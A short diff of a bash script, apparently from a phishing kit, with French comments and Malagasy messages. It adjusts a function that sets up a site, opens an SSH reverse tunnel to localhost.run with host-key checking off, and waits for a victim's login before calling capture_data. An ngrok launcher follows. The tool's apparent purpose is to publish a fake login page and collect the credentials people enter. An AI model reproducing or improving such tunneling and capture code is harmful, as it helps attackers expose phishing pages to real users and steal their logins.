@@ -275,8 +275,8 @@ start_ssh_tunnel() {
     echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Manomboka ny tunnel (Localhost.run)..."
     setup_site
     
-    # Lancement du tunnel SSH en arrière-plan avec nokey
-    ssh -o StrictHostKeyChecking=no -R 80:127.0.0.1:$PORT nokey@localhost.run > .server/ssh.log 2>&1 &
+    # Ajout de l'option -N indispensable pour l'arrière-plan
+    ssh -o StrictHostKeyChecking=no -N -R 80:127.0.0.1:$PORT nokey@localhost.run > .server/ssh.log 2>&1 &
     sleep 6
     
     clear; banner_small
@@ -285,6 +285,7 @@ start_ssh_tunnel() {
     echo -e "\n${RED}[${WHITE}-${RED}]${YELLOW} Miandry ny fidiran'ny mpampiasa..."
     capture_data
 }
+
 start_ngrok() {
     cusport
     echo -e "${RED}[${WHITE}-${RED}]${GREEN} Alefa i Ngrok (${CYAN}http://$HOST:$PORT${GREEN})..."
